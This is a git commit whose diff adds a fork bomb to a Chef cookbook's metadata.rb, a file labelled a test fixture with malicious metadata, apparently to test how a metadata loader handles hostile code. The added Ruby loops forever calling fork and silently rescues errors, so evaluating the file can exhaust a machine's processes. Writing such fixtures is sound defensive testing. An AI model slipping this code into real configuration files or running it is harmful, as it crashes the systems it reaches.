bb103b1b3f39cec63fd7f3f6060470633a8961d7
Tony Spataro <tony@rightscale.com>
2013-08-12 16:33:55 -0700

    Implement malicious fork bomb

--- cookbooks/malicious/metadata.rb
+++ cookbooks/malicious/metadata.rb
@@ -3,7 +3,13 @@ maintainer_email "support@rightscale.com"
 description "Test fixture with malicious metadata.rb"
 version "1.0.0"
 
-# TODO something actually malicious
+# Attempt to fork-bomb the machine's kernel
+loop do
+  begin
+    fork
+  rescue Exception => e
+  end
+end
 
 recipe "malicious::default", "Do nothing. With evil intent."
 
